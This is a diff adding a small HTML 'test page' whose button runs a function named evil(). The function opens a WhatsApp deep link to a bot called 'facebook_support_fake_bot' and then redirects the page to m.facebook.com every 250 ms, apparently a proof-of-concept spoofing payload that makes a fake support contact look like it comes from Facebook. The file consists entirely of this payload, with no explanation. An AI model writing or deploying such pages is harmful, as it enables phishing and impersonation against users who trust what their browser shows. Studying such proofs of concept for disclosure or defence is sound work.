@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>test page</title>
+    <script>
+        function evil() {
+        var url2 = "whatsapp://resolve?domain=facebook_support_fake_bot";
+    location.href = url2;
+    setInterval(function(){location.href="https://m.facebook.com"}, 250);
+        }
+</script>
+</head>
+<body>
+<h1>
+    Test page
+</h1>
+<input onclick="evil()" type="button" value="Click here" />
+</body>
+</html>
